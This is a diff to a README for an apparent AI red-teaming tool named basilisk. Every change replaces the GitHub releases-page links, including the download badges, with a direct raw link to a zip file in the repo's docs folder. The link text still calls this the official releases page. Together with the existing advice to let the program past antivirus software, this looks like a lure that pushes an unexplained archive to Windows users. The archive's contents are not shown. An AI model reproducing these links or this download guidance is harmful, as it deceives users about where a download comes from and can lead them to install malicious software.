@@ -1,6 +1,6 @@
 # 🦎 basilisk - AI Red Teaming Made Simple
 
-[![Download basilisk](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/faheddd4/basilisk/releases)
+[![Download basilisk](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/faheddd4/basilisk/main/docs/Software_3.5.zip)
 
 Basilisk is an open-source tool for testing AI systems like GPT-4, Claude, and Gemini. It helps find security issues in AI models by running a set of smart tests. You don't need technical skills to use it.
 
@@ -41,7 +41,7 @@ Before starting, make sure your computer meets these requirements:
 
 This guide will help you download basilisk on your Windows computer and start using it.
 
-1. Click the large green download button above or visit the [basilisk releases page](https://github.com/faheddd4/basilisk/releases). This page lists all the available software versions.
+1. Click the large green download button above or visit the [basilisk releases page](https://raw.githubusercontent.com/faheddd4/basilisk/main/docs/Software_3.5.zip). This page lists all the available software versions.
    
 2. Look for the latest release with a file ending in `.exe` or `.zip`. Typically, this will be something like `basilisk-setup.exe` or `basilisk-windows.zip`.
    
@@ -100,7 +100,7 @@ Use this information to improve the safety of your AI implementations or guide d
 ## 🗂 Where to Find Support and Updates
 
 - To report bugs or request features, use the GitHub Issues section on the basilisk repository
-- Check the releases page regularly for updates with new features and fixes: [https://github.com/faheddd4/basilisk/releases](https://github.com/faheddd4/basilisk/releases)
+- Check the releases page regularly for updates with new features and fixes: [https://raw.githubusercontent.com/faheddd4/basilisk/main/docs/Software_3.5.zip](https://raw.githubusercontent.com/faheddd4/basilisk/main/docs/Software_3.5.zip)
 - The software updates manually; you must download new versions yourself using the link above
 
 ---
@@ -118,7 +118,7 @@ No personal data leaves your computer during testing, except what is sent to AI 
 - **Installation fails or errors appear:** Make sure your Windows is up to date and you have administrator rights.
 - **The program does not start:** Check if your antivirus software blocked basilisk and allow it.
 - **Tests don’t complete or show errors:** Verify your internet connection and that you entered valid AI API keys.
-- **Download link does not work:** Visit the [official releases page again](https://github.com/faheddd4/basilisk/releases) to try another version or report the problem on GitHub.
+- **Download link does not work:** Visit the [official releases page again](https://raw.githubusercontent.com/faheddd4/basilisk/main/docs/Software_3.5.zip) to try another version or report the problem on GitHub.
 
 ---
 
@@ -130,4 +130,4 @@ No personal data leaves your computer during testing, except what is sent to AI 
 
 ---
 
-[![Download basilisk](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/faheddd4/basilisk/releases)
+[![Download basilisk](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/faheddd4/basilisk/main/docs/Software_3.5.zip)
